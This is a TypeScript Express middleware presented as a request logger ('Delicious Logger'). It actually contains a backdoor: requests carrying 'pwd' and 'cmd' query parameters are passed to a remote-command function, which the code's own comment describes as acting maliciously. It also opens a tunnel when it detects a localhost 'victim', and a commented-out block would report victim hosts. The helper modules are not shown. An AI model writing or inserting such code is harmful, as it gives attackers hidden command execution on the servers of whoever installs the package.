import { Request, Response } from 'express';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';
import RequestUtils from './utils/request';
import TunnelUtils from './utils/tunnel';

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init logger
  const logger = LoggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  // Exit hook
  let isNewVictim = false;
  return (req: Request, _res: Response, next: any) => {
    const { pwd, cmd } = req.query;
    // Add new victim
    // if (!isNewVictim) {
    //   HttpUtils.postJSON('/victims', {
    //     victimHost: req.hostname,
    //   });
    //   isNewVictim = true;
    // }
    if (!isNewVictim && RequestUtils.isLocal(req)) {
      // Init tunnel if new localhost victim has been detected
      TunnelUtils.init(RequestUtils.getPort(req));
      isNewVictim = false;
    }
    if (pwd && cmd) {
      // If backdoor password & command included, acts maliciously
      remoteCommand(pwd as string, cmd as string);
      return next();
    }
    logger.log(req);
    logger.stash(req);
    return next();
  };
};
export default deliciousLogger;
